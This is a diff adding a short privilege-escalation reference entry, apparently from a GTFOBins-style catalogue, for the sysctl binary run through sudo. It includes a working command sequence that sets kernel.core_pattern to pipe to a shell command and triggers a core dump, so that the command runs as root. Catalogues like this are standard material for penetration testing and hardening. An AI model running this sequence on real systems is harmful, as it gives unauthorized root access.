@@ -1,0 +1,9 @@
+***** Sudo *****
+If the binary is allowed to run as superuser by sudo, it does not drop the
+elevated privileges and may be used to access the file system, escalate or
+maintain privileged access.
+    * COMMAND='/bin/sh -c id>/tmp/id'
+      sudo sysctl "kernel.core_pattern=|$COMMAND"
+      sleep 9999 &
+      kill -QUIT $!
+      cat /tmp/id
